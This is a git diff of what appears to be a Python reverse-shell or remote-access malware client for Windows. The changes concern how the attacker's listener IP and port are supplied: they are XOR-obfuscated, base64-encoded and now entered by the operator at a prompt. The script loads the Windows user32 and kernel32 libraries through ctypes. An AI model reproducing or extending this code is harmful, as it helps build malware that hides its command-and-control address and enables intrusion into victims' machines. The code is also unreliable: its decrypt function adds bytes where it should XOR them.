@@ -7,8 +7,12 @@ import sys
 import ctypes
 
 KEY = b"X" * 32  #KEY FOR XOR
-ENCRYPTED_HOST = base64.b64decode("aWFqdmluYHZpaGh2aWg=") # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
-ENCRYPTED_PORT = base64.b64decode("bGxsbA==") # ECRYPTED PORT (PORT OF THE ATTACKER)
+
+def encrypt(data):
+    return base64.b64encode(bytes(a ^ b for a, b in zip(data.encode(), (KEY * (len(data) // len(KEY) + 1))[:len(data)]))).decode() 
+
+ENCRYPTED_HOST = base64.b64decode(encrypt(input("give ur listener IP : "))) # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
+ENCRYPTED_PORT = base64.b64decode(encrypt(input("give ur listener PORT : "))) # ECRYPTED PORT (PORT OF THE ATTACKER)
 
 #--- FUNCTION TO DECRYPT THE XOR DATA ===
 
@@ -16,8 +20,7 @@ def xor_decrypt(data, key):
     return bytes(a + b for a, b in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))
 
 HOST = xor_decrypt(ENCRYPTED_HOST, KEY).decode('latin-1') # DECRYPT HOST
-#PORT = int(xor_decrypt(ENCRYPTED_PORT, KEY).decode('utf-8'),16) # DECRYPTO PORT
-PORT = int(xor_decrypt(ENCRYPTED_PORT , KEY).decode())
+PORT = int(xor_decrypt(ENCRYPTED_PORT , KEY).decode()) # DECRYPT PORT 
 
 user32=ctypes.windll.user32
 kernel32=ctypes.windll.kernel32
